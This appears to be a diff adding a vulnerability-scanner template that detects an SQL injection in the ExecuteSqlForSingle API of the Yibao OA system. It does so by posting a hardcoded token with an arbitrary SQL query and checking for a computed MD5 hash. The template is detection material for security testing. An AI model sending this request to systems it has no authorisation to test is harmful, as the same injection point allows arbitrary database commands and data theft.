@@ -1,0 +1,31 @@
+id: poc-yaml-yi-bao-oa-system-executesqlforsingle-sqli
+info:
+  name: 易宝OA系统ExecuteSqlForSingle接口SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    易宝OA系统ExecuteSqlForSingle接口存在SQL注入漏洞。攻击者可通过构造恶意请求来执行任意SQL语句。
+
+variables:
+  t1: "{{rand_int(1000,5000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/system/ExecuteSqlForSingle"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      token=zxh&sql=select substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','{{t1}}')),3,32)&strParameters
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
+          - "\"message\":\"success\""
